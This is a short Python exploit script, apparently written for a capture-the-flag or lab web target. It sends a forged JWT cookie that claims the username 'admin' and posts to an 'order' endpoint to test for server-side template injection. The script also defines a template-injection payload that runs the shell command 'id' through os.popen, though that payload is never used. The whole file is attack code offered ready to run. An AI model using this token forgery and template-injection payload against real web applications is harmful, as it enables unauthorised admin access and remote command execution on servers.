#!/usr/bin/python3


import requests
import sys
from pwn import *
from pprint import pprint

def make_intrusion(url):

    ress = requests.get(url=url+"home", cookies={"auth":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNtg"})
    print(ress.text)

    pprint(ress.status_code)




def ssti_explotation(url):

    ssti_payload = "{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}"
        
    ress = requests.post(url=url+"order", 
            data={"costume":"{{ 7*7 }}", "q":"10", "addr":"test"}, 
            cookies={"auth":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8JUBz8oy5DlaoSmr0ffLb_hrdSHl0iLMGz-Ece7VNt"})

    print(ress.text)



def main():

    # if __name__ == "__main__":

    try:

        url = sys.argv[1]
        ssti_explotation(url)

    except Exception as e:
        print(str(e))
        exit(1)

    except KeyboardInterrupt:
        exit(0)


if __name__ == "__main__":
    main()
